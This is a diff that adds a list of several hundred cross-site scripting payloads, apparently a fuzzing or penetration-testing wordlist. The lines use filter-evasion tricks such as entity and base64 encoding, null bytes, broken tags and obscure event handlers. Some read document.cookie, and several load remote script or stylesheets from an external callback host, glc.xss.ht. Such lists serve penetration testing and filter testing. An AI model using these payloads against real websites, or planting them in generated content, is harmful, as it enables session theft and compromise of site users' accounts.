@@ -1,0 +1,399 @@
+&#00;</form><input type&#61;"date" onfocus="confirm(1)">
+¼script¾confirm(¢XSS¢)¼/script¾
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:confirm(1)&gt;`>
+%253Cscript%253Econfirm('XSS')%253C%252Fscript%253E
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+a="get";b="URL";c="javascript:";d="confirm('xss');";eval(a+b+c+d);
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:confirm(1)></a>">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:confirm(1)>XXX</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<a href="jAvAsCrIpT&colon;confirm&lpar;1&rpar;">X</a>
+<a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:confirm(1)&NewLine;>X</a>
+"/></a></><img src=1.gif onerror=confirm(1)>
+confirm(String.fromCharCode(88,83,83));'))">
+'-confirm(1)-'
+'); confirm('XSS
+\";confirm('XSS');//
+'); confirm('xss'); var x='
+\\'); confirm(\'xss\');var x=\'
+&apos;;confirm(String.fromCharCode(88,83,83))//\&apos;;confirm(String.fromCharCode(88,83,83))//&quot;;confirm(String.fromCharCode(88,83,83))//\&quot;;confirm(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;confirm(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+<a style="-o-link:'javascript:javascript:confirm(1)';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:confirm(1);">XXX</a></a><a href="javascript:javascript:confirm(1)">XXX</a>
+<BASE HREF="javascript:confirm('XSS');//">
+<BGSOUND SRC="javascript:confirm('XSS');">
+<BODY BACKGROUND="javascript:confirm('XSS')">
+<body background=javascript:'"><script>confirm(navigator.userAgent)</script>></body>
+<body oninput=javascript:confirm(1)><input autofocus>
+<body onLoad="confirm('XSS');"
+<BODY ONLOAD=confirm('XSS')>
+<BODY ONLOAD=confirm("XSS")>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm("XSS")>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm("XSS")>
+<body/onload=&lt;!--&gt;&#10confirm(1)>
+<body onLoad="while(true) confirm('XSS');">
+<body onunload="javascript:confirm('XSS');">
+<BR SIZE="&{confirm('XSS')}">
+<br size=\"&{confirm('XSS')}\">
+</br style=a:expression(confirm())>
+<b <script>confirm(1)</script>0
+[color=red' onmouseover="confirm('xss')"]mouse over[/color]
+[color=red width=expression(confirm(123))][color]
+<comment><img src="</comment><img src=x onerror=javascript:confirm(1))//">
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+<div id="div1"><input value="``onmouseover=javascript:confirm(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id=d><x xmlns="><iframe onload=javascript:confirm(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<div/onmouseover='confirm(1)'> style="x:">
+<div onmouseover='confirm&lpar;1&rpar;'>DIV</div>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:confirm('XSS'))">
+<DIV STYLE="background-image: url(javascript:confirm('XSS'))">
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:confirm(1));">X
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="confirm(1)">x</button>
+<div style=width:1px;filter:glow onfilterchange=javascript:confirm(1)>x
+<DIV STYLE="width: expression(confirm('XSS'));">
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<? echo('<scr)'; echo('ipt>confirm(\"XSS\")</script>'); ?>
+<? echo('<SCR)';echo('IPT>confirm("XSS")</SCRIPT>'); ?>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed src="javascript:confirm(1)">
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://glc.xss.ht></SCRIPT>'"-->
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(confirm("XSS"))'>
+<font style='color:expression(confirm(document.cookie))'>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:confirm(1)</script>">
+<! foo="><script>javascript:confirm(1)</script>">
+<? foo="><script>javascript:confirm(1)</script>">
+</ foo="><script>javascript:confirm(1)</script>">
+<? foo="><x foo='?><script>javascript:confirm(1)</script>'>">
+<% foo><x foo="%><script>javascript:confirm(1)</script>">
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+<form><button formaction=javascript&colon;confirm(1)>CLICKME
+<form><iframe &#09;&#10;&#11; src="javascript&#58;confirm(1)"&#11;&#10;&#09;;>
+<form><isindex formaction="javascript&colon;confirm(1)"
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<FRAMESET><FRAME SRC="javascript:confirm('XSS');"></FRAMESET>
+<FRAMESET><FRAME SRC=\"javascript:confirm('XSS');\"></FRAMESET>
+<frameset onload=javascript:confirm(1)>
+"><h1><IFRAME SRC="javascript:confirm('XSS');"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="confirm(document.cookie)"></IFRAME>123</h1>
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="confirm(document.cookie)"></IFRAME>123</h1>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:confirm(1)//#">XXX</a></body>
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-confirm('XSS');+ADw-/SCRIPT+AD4-
+<html><noconfirm><noscript>(123)</noscript><script>(123)</script>
+http://www.google<script .com>confirm(document.location)</script
+<!--[if<img src=x onerror=javascript:confirm(1)//]> -->
+<iframe/onreadystatechange=confirm(1)
+<iframe<?php echo chr(11)?> onload=confirm('XSS')></iframe>
+"></iframe><script>confirm(123)</script>
+"></iframe><script>confirm(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<iframe/src="data:text/html,<svg &#111;&#110;load=confirm(1)>">
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<iframe src=http://glc.xss.ht/scriptlet.html <
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+<iframe src="javascript:confirm('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
+<IFRAME SRC="javascript:confirm('XSS');"></IFRAME>
+<iframe// src=javaSCRIPT&colon;confirm(1)
+<iframe src=javascript&colon;confirm&lpar;document&period;location&rpar;>
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<iframe/src \/\/onload = prompt(1)
+<IFRAME SRC=# onmouseover="confirm(document.cookie)"></IFRAME>
+<iframe src="&Tab;javascript:prompt(1)&Tab;">
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<IFRAME width="420" height="315" frameborder="0" onload="confirm(document.cookie)"></IFRAME>
+<!--[if]><script>javascript:confirm(1)</script -->
+<image src="javascript:confirm(1)">
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<img[a][b][c]src[d]=x[e]onerror=[f]"confirm(1)">
+<IMG DYNSRC="javascript:confirm('XSS')">
+<IMG DYNSRC=\"javascript:confirm('XSS')\">
+<IMG LOWSRC="javascript:confirm('XSS')">
+<IMG LOWSRC=\"javascript:confirm('XSS')\">
+<img """><script>confirm("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+<IMG """><SCRIPT>confirm("XSS")</SCRIPT>">
+<IMG SRC=" &#14; javascript:confirm('XSS');">
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<img src=foo.png onerror=confirm(/xssed/) />
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
+<!--<img src="--><img src=x onerror=javascript:confirm(1)//">
+<![><img src="]><img src=x onerror=javascript:confirm(1)//">
+<img src ?itworksonchrome?\/onerror = confirm(1)
+<img src="javascript:confirm(1)">
+<IMG SRC=javascript:confirm(&quot;XSS&quot;)>
+<IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))>
+<IMG SRC="javascript:confirm('XSS');">
+<IMG SRC="javascript:confirm('XSS')"
+<img src="javascript:confirm('XSS')">
+<IMG SRC=javascript:confirm('XSS')>
+<IMG SRC=\"jav&#x09;ascript:confirm('XSS');\">
+<IMG SRC=\"jav&#x0A;ascript:confirm('XSS');\">
+<IMG SRC="jav&#x0D;ascript:confirm('XSS');">
+<IMG SRC=\"jav&#x0D;ascript:confirm('XSS');\">
+<img src=``&NewLine; onerror=confirm(1)&NewLine;
+<--`<img/src=` onerror=confirm(1)> --!>
+<img src onerror /" '"= alt=javascript:confirm(1)//">
+<img/src=`` onerror=this.onerror=confirm(1) 
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src\x00=x onerror="javascript:confirm(1)">
+<img src\x09=x onerror="javascript:confirm(1)">
+<img src\x10=x onerror="javascript:confirm(1)">
+<img src\x11=x onerror="javascript:confirm(1)">
+<img src\x12=x onerror="javascript:confirm(1)">
+<img src\x13=x onerror="javascript:confirm(1)">
+<img src\x32=x onerror="javascript:confirm(1)">
+<img src\x47=x onerror="javascript:confirm(1)">
+<IMG SRC=x onabort="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onafterprint="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onblur="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplay="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplaythrough="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onclick="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncontextmenu="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncopy="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncuechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncut="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondblclick="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrag="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragend="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragenter="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragleave="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragover="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragstart="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrop="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondurationchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onemptied="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onended="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="confirm(String.fromCharCode(88,83,83))">
+<img src=x onerror=\x00"javascript:confirm(1)">
+<img src=x onerror=\x09"javascript:confirm(1)">
+<img src=x onerror=\x10"javascript:confirm(1)">
+<img src=x onerror=\x11"javascript:confirm(1)">
+<img src=x onerror=\x12"javascript:confirm(1)">
+<img src=x onerror=\x32"javascript:confirm(1)">
+<IMG SRC=x onhashchange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninput="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninvalid="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeydown="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeypress="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeyup="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadeddata="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadedmetadata="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadstart="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousedown="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onoffline="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ononline="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpagehide="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpageshow="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpaste="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpause="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplay="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplaying="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpopstate="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onprogress="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onratechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onreset="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onresize="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onscroll="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsearch="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeked="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeking="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onselect="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstalled="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstorage="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsubmit="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsuspend="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontimeupdate="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onunload="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="confirm(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwheel="confirm(String.fromCharCode(88,83,83))">
+<img src="x` `<script>javascript:confirm(1)</script>"` `>
+<img src=x\x09onerror="javascript:confirm(1)">
+<img src=x\x10onerror="javascript:confirm(1)">
+<img src=x\x11onerror="javascript:confirm(1)">
+<img src=x\x12onerror="javascript:confirm(1)">
+<img src=x\x13onerror="javascript:confirm(1)">
+<img src=`xx:xx`onerror=confirm(1)>
+<IMG STYLE="xss:expr/*XSS*/ession(confirm('XSS'))">
+<img \x00src=x onerror="confirm(1)">
+<img \x00src=x onerror="javascript:confirm(1)">
+<img\x10src=x onerror="javascript:confirm(1)">
+<img \x11src=x onerror="javascript:confirm(1)">
+<img\x11src=x onerror="javascript:confirm(1)">
+<img \x12src=x onerror="javascript:confirm(1)">
+<img\x13src=x onerror="javascript:confirm(1)">
+<img\x32src=x onerror="javascript:confirm(1)">
+<img \x34src=x onerror="javascript:confirm(1)">
+<img \x39src=x onerror="javascript:confirm(1)">
+<img \x47src=x onerror="javascript:confirm(1)">
+<img\x47src=x onerror="javascript:confirm(1)">
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<INPUT TYPE="BUTTON" action="confirm('XSS')"/>
+<INPUT TYPE="IMAGE" SRC="javascript:confirm('XSS');">
+<input type="text" value=`` <div/onmouseover='confirm(1)'>X</div>
+<input value=<><iframe/src=javascript:confirm(1)
+">/KinG-InFeT.NeT/><script>confirm(document.cookie)</script>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:confirm(1))%7d
+<LINK REL="stylesheet" HREF="http://glc.xss.ht/xss.css">
+<LINK REL="stylesheet" HREF="javascript:confirm('XSS');">
+<li style=list-style:url() onerror=javascript:confirm(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:confirm(1)></div>
+&lt;BASE HREF=&quot;javascript:confirm(&apos;XSS&apos;);//&quot;&gt;
+&lt;BGSOUND SRC=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY BACKGROUND=&quot;javascript:confirm(&apos;XSS&apos;);&quot;&gt;
+&lt;BODY ONLOAD=confirm(&apos;XSS&apos;)&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:confirm(&apos;XSS&apos;))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(confirm(&apos;XSS&apos;));&quot;&gt;
+&lt;SCRIPT&gt;confirm(&apos;XSS&apos;)&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;confirm(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&lt;SCRIPT SRC=https://glc.xss.ht&gt;&lt;/SCRIPT&gt;
+<marquee onstart='javascript:confirm&#x28;1&#x29;'>^__^
+<marquee><script>confirm('XSS')</script></marquee>
+<math href="javascript:javascript:confirm(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:confirm(1)">CLICKME</maction> </math>
+<meta charset="mac-farsi">¼script¾javascript:confirm(1)¼/script¾
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>confirm&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; confirm(1)" http-equiv="refresh"/>
+<META HTTP-EQUIV="Link" Content="<http://glc.xss.ht/xss.css>; REL=stylesheet">
+<meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:confirm('XSS');">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:confirm('XSS');\">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm('XSS');">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:confirm('XSS');\">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>confirm('XSS')</SCRIPT>">
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="confirm(1)";
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:confirm(1)"></OBJECT>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:confirm(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://glc.xss.ht/scriptlet.html"></OBJECT>
+" onfocus=confirm(document.domain) "> <"
+perl -e 'print "<IMG SRC=java\0script:confirm(\"XSS\")>";' > out
+perl -e 'print \"<IMG SRC=java\0script:confirm(\"XSS\")>\";' > out
+perl -e 'print \"<SCR\0IPT>confirm(\"XSS\")</SCR\0IPT>\";' > out
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<script>({0:#0=eval/#0#/#0#(javascript:confirm(1))})</script>
+<script>+-+-1-+-+confirm(1)</script>
+>"><ScRiPt%20%0a%0d>confirm(561177485777)%3B</ScRiPt>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<script ~~~>confirm(0%0)</script ~~~>
+"><script>confirm(0)</script>
+<script>confirm(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>confirm(1337)</script>"><script>confirm("XSS by \nxss</h1></marquee>
+<%<!--'%><script>confirm(1);</script -->
+<script>confirm(1);</script>
+<script /**/>/**/confirm(1)/**/</script /**/
+<script ^__^>confirm(String.fromCharCode(49))</script ^__^
+<script>confirm(String.fromCharCode(88,83,83))</script> 
+"><script confirm(String.fromCharCode(88,83,83))</script>
+'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+"><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+\'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+<script>confirm("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>confirm("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+<<SCRIPT>confirm("XSS");//<</SCRIPT>
+<?='<SCRIPT>confirm("XSS")</SCRIPT>'?>
+<SCRIPT> confirm(“XSS”); </SCRIPT>
+<script>confirm('XSS');</script>
+='><script>confirm("xss")</script>
+!--" /><script>confirm('xss');</script>
+'">><script>confirm('XSS')</script>
+<SCRIPT "a='>'" SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=`>` SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT a=">" SRC="https://glc.xss.ht"></SCRIPT>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:confirm(1)</SCRIPT>
+</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<script itworksinallbrowsers>/*<script* */confirm(1)</script
+'""><script language="JavaScript"> confirm('X \nS \nS');</script>
+<script language="JavaScript">confirm('XSS')</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:confirm(1)')()</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:confirm(1)}),x</script>
+</script><script>confirm(1)</script>
+//--></SCRIPT><SCRIPT>confirm(String.fromCharCode(88,83,83));
+</script></script><<<<script><>>>><<<script>confirm(123)</script>
+<script>({set/**/$($){_/**/setter=$,_=javascript:confirm(1)}}).$=eval</script>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<script src="data:text/javascript,confirm(1)"></script>
+<SCRIPT SRC=//glc.xss.ht/.j>
+<SCRIPT SRC="http://glc.xss.ht/xss.jpg"></SCRIPT>
+<SCRIPT SRC=https://glc.xss.ht?< B >
+<SCRIPT =">" SRC="https://glc.xss.ht"></SCRIPT>
+<SCRIPT/SRC="https://glc.xss.ht"></SCRIPT>
+<script src="javascript:confirm(1)">
+<script>var var = 1; confirm(var)</script>
+<script x> confirm(1) </script 1=2
+<SCRIPT/XSS SRC="https://glc.xss.ht"></SCRIPT>
+<scrscriptipt>confirm(1)</scrscriptipt>
+<scr<script>ipt>confirm('XSS');</scr</script>ipt>
+'></select><script>confirm(123)</script>
+</style &#32;><script &#32; :-(>/**/confirm(document.location)/**/</script &#32; :-(
+<STYLE>BODY{-moz-binding:url("http://glc.xss.ht/xssmoz.xml#xss")}</STYLE>
+<style><img src="</style><img src=x onerror=javascript:confirm(1)//">
+<style>@import "data:,*%7bx:expression(javascript:confirm(1))%7D";</style>
+<STYLE>@import'http://glc.xss.ht/xss.css';</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:confirm("XSS")';</STYLE>
+<style>@im\port'\ja\vasc\ript:confirm(\"XSS\")';</style>
+<STYLE>li {list-style-image: url(\"javascript:confirm('XSS')\");}</STYLE><UL><LI>XSS
+<STYLE>li {list-style-image: url("javascript:confirm('XSS')");}</STYLE><UL><LI>XSS</br>
+<style/onload=&lt;!--&#09;&gt;&#10;confirm&#10;&lpar;1&rpar;>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:confirm(1)'}{}*{-o-link-source:current}]{color:red};</style>
+}</style><script>a=eval;b=confirm;a(b(/XSS/.source));</script>
+<///style///><span %2F onmousemove='confirm&lpar;1&rpar;'>SPAN
+<STYLE type="text/css">BODY{background:url("javascript:confirm('XSS')")}</STYLE>
+<STYLE TYPE="text/javascript">confirm('XSS');</STYLE>
+<// style=x:expression\28javascript:confirm(1)\29>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:confirm(1))}</style>
+<STYLE>.XSS{background-image:url("javascript:confirm('XSS')");}</STYLE><A CLASS=XSS></A>
+<svg/onload=confirm(1)
+<sVg><scRipt >confirm&lpar;1&rpar; {Opera}
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> confirm(1)
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>confirm&#x28;1&#x29; {Opera}
+<TABLE BACKGROUND="javascript:confirm('XSS')">
+<table background="javascript:javascript:confirm(1)">
+<TABLE><TD BACKGROUND="javascript:confirm('XSS')">
+<TD BACKGROUND="javascript:confirm('XSS')">
+</textarea>'"><script>confirm(document.cookie)</script>
+</textarea><script>confirm(/xss/)</script>
+<title onpropertychange=javascript:confirm(1)></title><title title=>
+'"></title><script>confirm(1111)</script>
+'"></title><script>confirm(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>confirm("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+</title><script>confirm(/xss/)</script>
+</TITLE><SCRIPT>confirm("XSS");</SCRIPT>
+<var onmouseover="prompt(1)">On Mouse Over</var>
+window.confirm("Bonjour !");
+">/XaDoS/><script>confirm(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+<x '="foo"><x foo='><img src=x onerror=javascript:confirm(1)//'>
+<XSS STYLE="xss:expression(confirm('XSS'))">
